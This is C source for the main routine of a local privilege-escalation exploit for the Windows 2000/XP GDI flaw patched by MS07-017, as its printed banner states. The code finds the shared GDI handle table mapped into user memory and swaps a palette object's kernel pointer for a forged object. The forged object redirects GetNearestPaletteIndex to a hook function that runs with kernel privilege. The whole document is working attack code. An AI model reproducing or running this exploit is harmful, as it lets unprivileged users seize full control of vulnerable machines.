int main(int argc, char *argv[])
{    
    SECTION_BASIC_INFORMATION SectionInfo;    
    PGDI_TABLE_ENTRY pGdiEntry;
    PLOGPALETTE pLogPal;
    HANDLE hPal;
    PVOID OriginalPalObject;
    PVOID FalsePalObject; 
       
    HANDLE hThread = GetCurrentThread();  
    DWORD OriginalThreadPriotity = GetThreadPriority (hThread);  
    HANDLE hSection = (ULONG)0;  
    PVOID MapFile = 0;
    HANDLE hProcess = (HANDLE)0xFFFFFFFF;
    WORD Pid = GetCurrentProcessId();                 
                  
   	NtQuerySection = (NTQUERYSECTION)GetProcAddress(LoadLibrary( "ntdll.dll"),"NtQuerySection");
         
    printf ("##########################################################\n");                
    printf ("# GDI Local Elevation of Privilege Vulnerability Exploit #\n");
    printf ("#        All Windows 2000/XP before MS07-017 patch       #\n");
    printf ("##########################################################\n");   
    printf ("# coded by Lionel d'Hauenens   http://www.labo-asso.com  #\n");
    printf ("##########################################################\n\n");                                     
                                                      
    // Search handle section and mapper in virtual memory of user
    while ((DWORD)hSection<0xFFFF) 
    {
        SectionInfo.Attributes = 0;  
        MapFile = MapViewOfFile((HANDLE)hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0); 
        if (MapFile)
        {
            NtQuerySection((HANDLE)hSection,0,&SectionInfo,sizeof(SectionInfo),0);
            if (SectionInfo.Attributes == SEC_COMMIT) break;  // For compatibility with win2k 
            UnmapViewOfFile(MapFile); 
            MapFile = 0;
        }                
        hSection++;
    }

    if (!MapFile)
    {
       printf ("Could not found shared section !\n");
       exit(0);             
    }              

    // Create Palette
    pLogPal = (PLOGPALETTE) calloc (sizeof(LOGPALETTE)+sizeof(PALETTEENTRY), 1);    
    pLogPal->palNumEntries = 1;
    pLogPal->palVersion = 0x300;
    hPal = (HANDLE)CreatePalette(pLogPal);  
    
    if (!hPal)
    {
       printf ("Could not create palette !\n");
       exit(0);             
    }      
    
    // Search the entry of pal object 
    OriginalPalObject = (PVOID)0;        
    pGdiEntry = (PGDI_TABLE_ENTRY)MapFile;
    while ((DWORD)pGdiEntry < ((DWORD)MapFile) + SectionInfo.Size.QuadPart)
    {
          if ( pGdiEntry->ProcessID == Pid  &&
                  pGdiEntry->nType == PAL_TYPE )
          {
              // Save original pointer
              OriginalPalObject =  (PVOID)pGdiEntry->pKernelInfo;                          
              break;
          }           
          pGdiEntry++;          
    }

    if (!OriginalPalObject)
    {
       printf ("Could not find entry of Pal object !\n");
       exit(0);                  
    }  
    
    // Create the false Pal object
    FalsePalObject                   = (PVOID) calloc(0x100/4,4);
    ((PDWORD)FalsePalObject)[0]      = (DWORD)hPal;   // Handle    
    ((PDWORD)FalsePalObject)[0x14/4] = (DWORD) 1;     // Availabled flag
    ((PVOID*)FalsePalObject)[0x3C/4] = (PVOID) &hook; // Interface GetNearestPaletteIndex 
  
    printf ("Section:\n--------\n");                                                             
    printf ("Handle: 0x%08X    Attributes: %08X    Size: 0x%08X\n\n", hSection
                                                                    , SectionInfo.Attributes
                                                                    , SectionInfo.Size.QuadPart);
    printf ("Pointer of original pal object: 0x%08X\n", OriginalPalObject); 
    printf ("Address of user map: 0x%08X\n", MapFile); 
    printf ("Pointer of false pal object: 0x%08X\n", FalsePalObject);  
    printf ("Entry of GDI palette in user view: 0x%08X\n", MapFile+((((ULONG)hPal) & 0xFFFF)*sizeof(GDI_TABLE_ENTRY)) );     
    printf ("Address of Hook(): 0x%08X\n\n", &hook);  

    //////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////  
    printf ("->Test...");
    flag_test = 0;            
    SetThreadPriority (hThread, THREAD_PRIORITY_HIGHEST); 
         
         // Active false Pal object    
         pGdiEntry->pKernelInfo = FalsePalObject;   
                 
              GetNearestPaletteIndex (hPal, 0); //--> call hook() with kernel privilege :);
             
         // Restore original Pal object
         pGdiEntry->pKernelInfo = OriginalPalObject; 
    
    SetThreadPriority (hThread,OriginalThreadPriotity);
    //////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////
    
    if (!flag_test) printf ("ERROR !!!\n");
    else printf ("OK :)\n");

    UnmapViewOfFile(MapFile);
    DeleteObject ((HANDLE)hPal);
    free((PVOID)pLogPal);
    free((PVOID)FalsePalObject);  
    system("PAUSE");          
    return (0);         
}